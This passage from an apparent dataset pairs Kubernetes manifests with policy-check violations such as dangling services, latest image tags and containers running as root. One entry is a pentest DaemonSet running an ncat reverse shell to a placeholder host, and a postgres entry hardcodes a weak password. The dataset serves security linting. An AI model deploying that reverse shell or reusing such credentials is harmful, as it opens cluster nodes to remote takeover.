    "manifest_path": "data/manifests/the_stack_sample/sample_2821.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: trellodb\n  name: trellodb\nspec:\n  ports:\n  - port: 27017\n    targetPort: 27017\n  selector:\n    name: trellodb\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:trellodb])"
  },
  {
    "id": "7690",
    "manifest_path": "data/manifests/the_stack_sample/sample_2823.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: mattermost-team-edition\n  name: mattermost-team-edition\nspec:\n  ports:\n  - name: 8065-tcp\n    port: 8065\n    protocol: TCP\n    targetPort: 8065\n  - name: 8067-tcp\n    port: 8067\n    protocol: TCP\n    targetPort: 8067\n  - name: 8074-tcp\n    port: 8074\n    protocol: TCP\n    targetPort: 8074\n  - name: 8075-tcp\n    port: 8075\n    protocol: TCP\n    targetPort: 8075\n  selector:\n    deploymentconfig: mattermost-team-edition\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[deploymentconfig:mattermost-team-edition])"
  },
  {
    "id": "7691",
    "manifest_path": "data/manifests/the_stack_sample/sample_2824.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: neo4j-benchmark\n  labels:\n    app: neo4j-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        app: neo4j-benchmark\n    spec:\n      containers:\n      - name: neo4j-benchmark\n        image: eaybars/neo4j-benchmark\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JMH_FORK\n          value: '0'\n        - name: JAVA_OPTIONS\n          value: -Xms512m -Xmx512m\n        args:\n        - -insert.product.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.product.commit=1\n        - -insert.product.count=433000\n        - -insert.product.measurementBatch=1000\n        - -insert.product.reinitGraph=10000\n        - -insert.relatedProduct.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.relatedProduct.commit=1\n        - -insert.relatedProduct.count=433000\n        - -insert.relatedProduct.measurementBatch=1000\n        - -insert.relatedProduct.reinitGraph=10000\n        - -insert.productCategory.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.productCategory.commit=10\n        - -insert.productCategory.count=433000\n        - -insert.productCategory.measurementBatch=1000\n        - -insert.productCategory.reinitGraph=10000\n        - -insert.review.file=/opt/graphdb-benchmark/reviews_Kindle_Store_5.json.gz\n        - -insert.review.commit=20\n        - -insert.review.count=982000\n        - -insert.review.measurementBatch=1000\n        - -insert.review.reinitGraph=10000\n        - -query.rb=5\n        - -query.rb.reinitGraph=1\n        - -query.caul=5\n        - -query.caul.reinitGraph=1\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7692",
    "manifest_path": "data/manifests/the_stack_sample/sample_2824.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: neo4j-benchmark\n  labels:\n    app: neo4j-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        app: neo4j-benchmark\n    spec:\n      containers:\n      - name: neo4j-benchmark\n        image: eaybars/neo4j-benchmark\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JMH_FORK\n          value: '0'\n        - name: JAVA_OPTIONS\n          value: -Xms512m -Xmx512m\n        args:\n        - -insert.product.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.product.commit=1\n        - -insert.product.count=433000\n        - -insert.product.measurementBatch=1000\n        - -insert.product.reinitGraph=10000\n        - -insert.relatedProduct.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.relatedProduct.commit=1\n        - -insert.relatedProduct.count=433000\n        - -insert.relatedProduct.measurementBatch=1000\n        - -insert.relatedProduct.reinitGraph=10000\n        - -insert.productCategory.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.productCategory.commit=10\n        - -insert.productCategory.count=433000\n        - -insert.productCategory.measurementBatch=1000\n        - -insert.productCategory.reinitGraph=10000\n        - -insert.review.file=/opt/graphdb-benchmark/reviews_Kindle_Store_5.json.gz\n        - -insert.review.commit=20\n        - -insert.review.count=982000\n        - -insert.review.measurementBatch=1000\n        - -insert.review.reinitGraph=10000\n        - -query.rb=5\n        - -query.rb.reinitGraph=1\n        - -query.caul=5\n        - -query.caul.reinitGraph=1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"neo4j-benchmark\" is using an invalid container image, \"eaybars/neo4j-benchmark\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7693",
    "manifest_path": "data/manifests/the_stack_sample/sample_2824.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: neo4j-benchmark\n  labels:\n    app: neo4j-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        app: neo4j-benchmark\n    spec:\n      containers:\n      - name: neo4j-benchmark\n        image: eaybars/neo4j-benchmark\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JMH_FORK\n          value: '0'\n        - name: JAVA_OPTIONS\n          value: -Xms512m -Xmx512m\n        args:\n        - -insert.product.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.product.commit=1\n        - -insert.product.count=433000\n        - -insert.product.measurementBatch=1000\n        - -insert.product.reinitGraph=10000\n        - -insert.relatedProduct.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.relatedProduct.commit=1\n        - -insert.relatedProduct.count=433000\n        - -insert.relatedProduct.measurementBatch=1000\n        - -insert.relatedProduct.reinitGraph=10000\n        - -insert.productCategory.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.productCategory.commit=10\n        - -insert.productCategory.count=433000\n        - -insert.productCategory.measurementBatch=1000\n        - -insert.productCategory.reinitGraph=10000\n        - -insert.review.file=/opt/graphdb-benchmark/reviews_Kindle_Store_5.json.gz\n        - -insert.review.commit=20\n        - -insert.review.count=982000\n        - -insert.review.measurementBatch=1000\n        - -insert.review.reinitGraph=10000\n        - -query.rb=5\n        - -query.rb.reinitGraph=1\n        - -query.caul=5\n        - -query.caul.reinitGraph=1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"neo4j-benchmark\" does not have a read-only root file system"
  },
  {
    "id": "7694",
    "manifest_path": "data/manifests/the_stack_sample/sample_2824.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: neo4j-benchmark\n  labels:\n    app: neo4j-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        app: neo4j-benchmark\n    spec:\n      containers:\n      - name: neo4j-benchmark\n        image: eaybars/neo4j-benchmark\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JMH_FORK\n          value: '0'\n        - name: JAVA_OPTIONS\n          value: -Xms512m -Xmx512m\n        args:\n        - -insert.product.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.product.commit=1\n        - -insert.product.count=433000\n        - -insert.product.measurementBatch=1000\n        - -insert.product.reinitGraph=10000\n        - -insert.relatedProduct.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.relatedProduct.commit=1\n        - -insert.relatedProduct.count=433000\n        - -insert.relatedProduct.measurementBatch=1000\n        - -insert.relatedProduct.reinitGraph=10000\n        - -insert.productCategory.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.productCategory.commit=10\n        - -insert.productCategory.count=433000\n        - -insert.productCategory.measurementBatch=1000\n        - -insert.productCategory.reinitGraph=10000\n        - -insert.review.file=/opt/graphdb-benchmark/reviews_Kindle_Store_5.json.gz\n        - -insert.review.commit=20\n        - -insert.review.count=982000\n        - -insert.review.measurementBatch=1000\n        - -insert.review.reinitGraph=10000\n        - -query.rb=5\n        - -query.rb.reinitGraph=1\n        - -query.caul=5\n        - -query.caul.reinitGraph=1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"neo4j-benchmark\" is not set to runAsNonRoot"
  },
  {
    "id": "7695",
    "manifest_path": "data/manifests/the_stack_sample/sample_2824.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: neo4j-benchmark\n  labels:\n    app: neo4j-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        app: neo4j-benchmark\n    spec:\n      containers:\n      - name: neo4j-benchmark\n        image: eaybars/neo4j-benchmark\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JMH_FORK\n          value: '0'\n        - name: JAVA_OPTIONS\n          value: -Xms512m -Xmx512m\n        args:\n        - -insert.product.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.product.commit=1\n        - -insert.product.count=433000\n        - -insert.product.measurementBatch=1000\n        - -insert.product.reinitGraph=10000\n        - -insert.relatedProduct.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.relatedProduct.commit=1\n        - -insert.relatedProduct.count=433000\n        - -insert.relatedProduct.measurementBatch=1000\n        - -insert.relatedProduct.reinitGraph=10000\n        - -insert.productCategory.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.productCategory.commit=10\n        - -insert.productCategory.count=433000\n        - -insert.productCategory.measurementBatch=1000\n        - -insert.productCategory.reinitGraph=10000\n        - -insert.review.file=/opt/graphdb-benchmark/reviews_Kindle_Store_5.json.gz\n        - -insert.review.commit=20\n        - -insert.review.count=982000\n        - -insert.review.measurementBatch=1000\n        - -insert.review.reinitGraph=10000\n        - -query.rb=5\n        - -query.rb.reinitGraph=1\n        - -query.caul=5\n        - -query.caul.reinitGraph=1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"neo4j-benchmark\" has cpu request 0"
  },
  {
    "id": "7696",
    "manifest_path": "data/manifests/the_stack_sample/sample_2824.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: neo4j-benchmark\n  labels:\n    app: neo4j-benchmark\nspec:\n  template:\n    metadata:\n      labels:\n        app: neo4j-benchmark\n    spec:\n      containers:\n      - name: neo4j-benchmark\n        image: eaybars/neo4j-benchmark\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JMH_FORK\n          value: '0'\n        - name: JAVA_OPTIONS\n          value: -Xms512m -Xmx512m\n        args:\n        - -insert.product.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.product.commit=1\n        - -insert.product.count=433000\n        - -insert.product.measurementBatch=1000\n        - -insert.product.reinitGraph=10000\n        - -insert.relatedProduct.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.relatedProduct.commit=1\n        - -insert.relatedProduct.count=433000\n        - -insert.relatedProduct.measurementBatch=1000\n        - -insert.relatedProduct.reinitGraph=10000\n        - -insert.productCategory.file=/opt/graphdb-benchmark/meta_Kindle_Store.json.gz\n        - -insert.productCategory.commit=10\n        - -insert.productCategory.count=433000\n        - -insert.productCategory.measurementBatch=1000\n        - -insert.productCategory.reinitGraph=10000\n        - -insert.review.file=/opt/graphdb-benchmark/reviews_Kindle_Store_5.json.gz\n        - -insert.review.commit=20\n        - -insert.review.count=982000\n        - -insert.review.measurementBatch=1000\n        - -insert.review.reinitGraph=10000\n        - -query.rb=5\n        - -query.rb.reinitGraph=1\n        - -query.caul=5\n        - -query.caul.reinitGraph=1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"neo4j-benchmark\" has memory limit 0"
  },
  {
    "id": "7697",
    "manifest_path": "data/manifests/the_stack_sample/sample_2825.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: cowrie-loadbalancer\nspec:\n  type: LoadBalancer\n  selector:\n    app: cowrie\n  ports:\n  - protocol: TCP\n    name: ssh-port\n    port: 2222\n    targetPort: 2222\n  - protocol: TCP\n    name: telnet-23-port\n    port: 23\n    targetPort: 2223\n  - protocol: TCP\n    name: telnet-2223-port\n    port: 2223\n    targetPort: 2223\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:cowrie])"
  },
  {
    "id": "7698",
    "manifest_path": "data/manifests/the_stack_sample/sample_2828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website\nspec:\n  selector:\n    matchLabels:\n      app: website\n  template:\n    metadata:\n      labels:\n        app: website\n    spec:\n      containers:\n      - name: website\n        image: ghcr.io/project-mtee/website:latest\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: '1'\n          limits:\n            memory: 512Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"website\" is using an invalid container image, \"ghcr.io/project-mtee/website:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7699",
    "manifest_path": "data/manifests/the_stack_sample/sample_2828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website\nspec:\n  selector:\n    matchLabels:\n      app: website\n  template:\n    metadata:\n      labels:\n        app: website\n    spec:\n      containers:\n      - name: website\n        image: ghcr.io/project-mtee/website:latest\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: '1'\n          limits:\n            memory: 512Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"website\" does not have a read-only root file system"
  },
  {
    "id": "7700",
    "manifest_path": "data/manifests/the_stack_sample/sample_2828.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: website\nspec:\n  selector:\n    matchLabels:\n      app: website\n  template:\n    metadata:\n      labels:\n        app: website\n    spec:\n      containers:\n      - name: website\n        image: ghcr.io/project-mtee/website:latest\n        ports:\n        - containerPort: 80\n        resources:\n          requests:\n            memory: 512Mi\n            cpu: '1'\n          limits:\n            memory: 512Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"website\" is not set to runAsNonRoot"
  },
  {
    "id": "7701",
    "manifest_path": "data/manifests/the_stack_sample/sample_2829.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: wordpress\n  name: wordpress\n  namespace: wordpress\nspec:\n  ports:\n  - port: 8081\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: wordpress\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:wordpress])"
  },
  {
    "id": "7702",
    "manifest_path": "data/manifests/the_stack_sample/sample_2830.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kfserving-ingressgateway\n    kfserving: ingressgateway\n  name: kfserving-ingressgateway\n  namespace: istio-system\nspec:\n  selector:\n    matchLabels:\n      app: kfserving-ingressgateway\n      kfserving: ingressgateway\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: kfserving-ingressgateway\n        kfserving: ingressgateway\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n            weight: 2\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - ppc64le\n            weight: 2\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - s390x\n            weight: 2\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n                - ppc64le\n                - s390x\n      containers:\n      - args:\n        - proxy\n        - router\n        - --domain\n        - $(POD_NAMESPACE).svc.cluster.local\n        - --log_output_level=default:info\n        - --drainDuration\n        - 45s\n        - --parentShutdownDuration\n        - 1m0s\n        - --connectTimeout\n        - 10s\n        - --serviceCluster\n        - kfserving-ingressgateway\n        - --zipkinAddress\n        - zipkin:9411\n        - --proxyAdminPort\n        - '15000'\n        - --statusPort\n        - '15020'\n        - --controlPlaneAuthPolicy\n        - NONE\n        - --discoveryAddress\n        - istio-pilot:15010\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: INSTANCE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: ISTIO_META_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: ISTIO_META_CONFIG_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: ISTIO_META_ROUTER_MODE\n          value: sni-dnat\n        image: docker.io/istio/proxyv2:1.1.6\n        imagePullPolicy: IfNotPresent\n        name: istio-proxy\n        ports:\n        - containerPort: 15020\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 31400\n        - containerPort: 15029\n        - containerPort: 15030\n        - containerPort: 15031\n        - containerPort: 15032\n        - containerPort: 15443\n        - containerPort: 15090\n          name: http-envoy-prom\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 30\n          httpGet:\n            path: /healthz/ready\n            port: 15020\n            scheme: HTTP\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 40Mi\n        volumeMounts:\n        - mountPath: /etc/certs\n          name: istio-certs\n          readOnly: true\n        - mountPath: /etc/istio/ingressgateway-certs\n          name: ingressgateway-certs\n          readOnly: true\n        - mountPath: /etc/istio/ingressgateway-ca-certs\n          name: ingressgateway-ca-certs\n          readOnly: true\n      serviceAccountName: istio-ingressgateway-service-account\n      volumes:\n      - name: istio-certs\n        secret:\n          optional: true\n          secretName: istio.istio-ingressgateway-service-account\n      - name: ingressgateway-certs\n        secret:\n          optional: true\n          secretName: istio-ingressgateway-certs\n      - name: ingressgateway-ca-certs\n        secret:\n          optional: true\n          secretName: istio-ingressgateway-ca-certs\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"istio-proxy\" does not have a read-only root file system"
  },
  {
    "id": "7703",
    "manifest_path": "data/manifests/the_stack_sample/sample_2830.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kfserving-ingressgateway\n    kfserving: ingressgateway\n  name: kfserving-ingressgateway\n  namespace: istio-system\nspec:\n  selector:\n    matchLabels:\n      app: kfserving-ingressgateway\n      kfserving: ingressgateway\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: kfserving-ingressgateway\n        kfserving: ingressgateway\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n            weight: 2\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - ppc64le\n            weight: 2\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - s390x\n            weight: 2\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n                - ppc64le\n                - s390x\n      containers:\n      - args:\n        - proxy\n        - router\n        - --domain\n        - $(POD_NAMESPACE).svc.cluster.local\n        - --log_output_level=default:info\n        - --drainDuration\n        - 45s\n        - --parentShutdownDuration\n        - 1m0s\n        - --connectTimeout\n        - 10s\n        - --serviceCluster\n        - kfserving-ingressgateway\n        - --zipkinAddress\n        - zipkin:9411\n        - --proxyAdminPort\n        - '15000'\n        - --statusPort\n        - '15020'\n        - --controlPlaneAuthPolicy\n        - NONE\n        - --discoveryAddress\n        - istio-pilot:15010\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: INSTANCE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: ISTIO_META_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: ISTIO_META_CONFIG_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: ISTIO_META_ROUTER_MODE\n          value: sni-dnat\n        image: docker.io/istio/proxyv2:1.1.6\n        imagePullPolicy: IfNotPresent\n        name: istio-proxy\n        ports:\n        - containerPort: 15020\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 31400\n        - containerPort: 15029\n        - containerPort: 15030\n        - containerPort: 15031\n        - containerPort: 15032\n        - containerPort: 15443\n        - containerPort: 15090\n          name: http-envoy-prom\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 30\n          httpGet:\n            path: /healthz/ready\n            port: 15020\n            scheme: HTTP\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 40Mi\n        volumeMounts:\n        - mountPath: /etc/certs\n          name: istio-certs\n          readOnly: true\n        - mountPath: /etc/istio/ingressgateway-certs\n          name: ingressgateway-certs\n          readOnly: true\n        - mountPath: /etc/istio/ingressgateway-ca-certs\n          name: ingressgateway-ca-certs\n          readOnly: true\n      serviceAccountName: istio-ingressgateway-service-account\n      volumes:\n      - name: istio-certs\n        secret:\n          optional: true\n          secretName: istio.istio-ingressgateway-service-account\n      - name: ingressgateway-certs\n        secret:\n          optional: true\n          secretName: istio-ingressgateway-certs\n      - name: ingressgateway-ca-certs\n        secret:\n          optional: true\n          secretName: istio-ingressgateway-ca-certs\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"istio-ingressgateway-service-account\" not found"
  },
  {
    "id": "7704",
    "manifest_path": "data/manifests/the_stack_sample/sample_2830.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kfserving-ingressgateway\n    kfserving: ingressgateway\n  name: kfserving-ingressgateway\n  namespace: istio-system\nspec:\n  selector:\n    matchLabels:\n      app: kfserving-ingressgateway\n      kfserving: ingressgateway\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: kfserving-ingressgateway\n        kfserving: ingressgateway\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n            weight: 2\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - ppc64le\n            weight: 2\n          - preference:\n              matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - s390x\n            weight: 2\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: beta.kubernetes.io/arch\n                operator: In\n                values:\n                - amd64\n                - ppc64le\n                - s390x\n      containers:\n      - args:\n        - proxy\n        - router\n        - --domain\n        - $(POD_NAMESPACE).svc.cluster.local\n        - --log_output_level=default:info\n        - --drainDuration\n        - 45s\n        - --parentShutdownDuration\n        - 1m0s\n        - --connectTimeout\n        - 10s\n        - --serviceCluster\n        - kfserving-ingressgateway\n        - --zipkinAddress\n        - zipkin:9411\n        - --proxyAdminPort\n        - '15000'\n        - --statusPort\n        - '15020'\n        - --controlPlaneAuthPolicy\n        - NONE\n        - --discoveryAddress\n        - istio-pilot:15010\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: INSTANCE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: ISTIO_META_POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: ISTIO_META_CONFIG_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: ISTIO_META_ROUTER_MODE\n          value: sni-dnat\n        image: docker.io/istio/proxyv2:1.1.6\n        imagePullPolicy: IfNotPresent\n        name: istio-proxy\n        ports:\n        - containerPort: 15020\n        - containerPort: 80\n        - containerPort: 443\n        - containerPort: 31400\n        - containerPort: 15029\n        - containerPort: 15030\n        - containerPort: 15031\n        - containerPort: 15032\n        - containerPort: 15443\n        - containerPort: 15090\n          name: http-envoy-prom\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 30\n          httpGet:\n            path: /healthz/ready\n            port: 15020\n            scheme: HTTP\n          initialDelaySeconds: 1\n          periodSeconds: 2\n          successThreshold: 1\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 100m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 40Mi\n        volumeMounts:\n        - mountPath: /etc/certs\n          name: istio-certs\n          readOnly: true\n        - mountPath: /etc/istio/ingressgateway-certs\n          name: ingressgateway-certs\n          readOnly: true\n        - mountPath: /etc/istio/ingressgateway-ca-certs\n          name: ingressgateway-ca-certs\n          readOnly: true\n      serviceAccountName: istio-ingressgateway-service-account\n      volumes:\n      - name: istio-certs\n        secret:\n          optional: true\n          secretName: istio.istio-ingressgateway-service-account\n      - name: ingressgateway-certs\n        secret:\n          optional: true\n          secretName: istio-ingressgateway-certs\n      - name: ingressgateway-ca-certs\n        secret:\n          optional: true\n          secretName: istio-ingressgateway-ca-certs\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"istio-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "7705",
    "manifest_path": "data/manifests/the_stack_sample/sample_2833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  selector:\n    matchLabels:\n      app: postgres\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_PASSWORD\n          value: airflow\n        - name: POSTGRES_USER\n          value: airflow\n        - name: POSTGRES_DB\n          value: airflow\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres\" does not have a read-only root file system"
  },
  {
    "id": "7706",
    "manifest_path": "data/manifests/the_stack_sample/sample_2833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  selector:\n    matchLabels:\n      app: postgres\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_PASSWORD\n          value: airflow\n        - name: POSTGRES_USER\n          value: airflow\n        - name: POSTGRES_DB\n          value: airflow\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres\" is not set to runAsNonRoot"
  },
  {
    "id": "7707",
    "manifest_path": "data/manifests/the_stack_sample/sample_2833.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres\nspec:\n  selector:\n    matchLabels:\n      app: postgres\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: postgres\n    spec:\n      containers:\n      - name: postgres\n        image: postgres:12\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 5432\n        env:\n        - name: POSTGRES_PASSWORD\n          value: airflow\n        - name: POSTGRES_USER\n          value: airflow\n        - name: POSTGRES_DB\n          value: airflow\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres\" has cpu request 0"
  },
  {
    "id": "7708",
    "manifest_path": "data/manifests/the_stack_sample/sample_2834.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hostnetwork-revshell-daemonset\n  labels:\n    app: pentest\n    type: daemonset\nspec:\n  selector:\n    matchLabels:\n      app: pentest\n      type: daemonset\n  template:\n    metadata:\n      labels:\n        app: pentest\n        type: daemonset\n    spec:\n      containers:\n      - name: hostnetwork-revshell-daemonset\n        image: raesene/ncat\n        command:\n        - /bin/sh\n        - -c\n        - --\n        args:\n        - ncat --ssl $HOST $PORT -e /bin/bash;\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "7709",
